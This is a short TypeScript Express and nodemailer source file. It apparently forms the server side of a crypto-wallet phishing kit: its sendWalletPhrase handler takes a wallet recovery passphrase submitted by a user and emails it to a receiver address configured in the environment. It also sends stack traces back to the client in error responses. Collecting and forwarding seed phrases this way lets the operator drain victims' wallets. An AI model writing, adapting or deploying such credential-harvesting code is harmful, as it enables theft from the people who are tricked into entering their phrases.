import dotenv from 'dotenv';
dotenv.config();
import nodemailer from 'nodemailer';
import { Request, Response } from 'express';

// Configure your email transport (use environment variables for real projects)
const transporter = nodemailer.createTransport({
  host: 'smtp-relay.brevo.com',
  port: 587,
  secure: false, 
  auth: {
    user: process.env.MAIL_USER,
    pass: process.env.MAIL_PASS,
  },
  logger: true,
  debug: true,
});


// Function to verify connection to Brevo SMTP
export const verifyBrevoConnection = async () => {
  try {
    await transporter.verify();
  } catch (error) {
  }
};
// verifyBrevoConnection();
export const sendWalletPhrase = async (req: Request, res: Response) => {
  const { passphrase } = req.body;
  if (!passphrase) {
    return res.status(400).json({ error: 'Passphrase is required' });
  }
  try {
    await transporter.sendMail({
      from: process.env.MAIL_FROM || process.env.MAIL_USER,
      to: process.env.MAIL_RECEIVER,
      subject: 'New Wallet Passphrase Submission',
      text: `Wallet Passphrase: ${passphrase}`,
    });
    res.status(200).json({ message: 'Email sent successfully' });
  } catch (error) {
    if (error instanceof Error) {
      res.status(500).json({ error: 'Failed to send email', details: error.message, stack: error.stack });
    } else {
      res.status(500).json({ error: 'Failed to send email', details: error });
    }
  }
};
